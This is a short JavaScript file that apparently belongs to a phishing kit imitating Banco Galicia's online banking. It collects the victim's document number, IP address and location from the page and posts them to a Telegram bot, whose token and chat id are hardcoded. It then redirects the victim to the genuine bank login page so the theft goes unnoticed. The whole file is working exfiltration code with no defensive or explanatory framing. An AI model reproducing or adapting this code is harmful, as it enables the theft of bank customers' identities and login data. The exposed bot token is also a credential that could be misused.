//bot token
var telegram_bot_id = "6150387762:AAFVZo2_LGF13byZquAl2Qh8JBJ1qWvNbO4";
//chat id
var chat_id = -1002497636010;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("DocumentNumber").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "G4LICIA #2: " + u_name + "\n\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://onlinebanking.bancogalicia.com.ar/login';
        console.log(response);
    });
    return false;
};
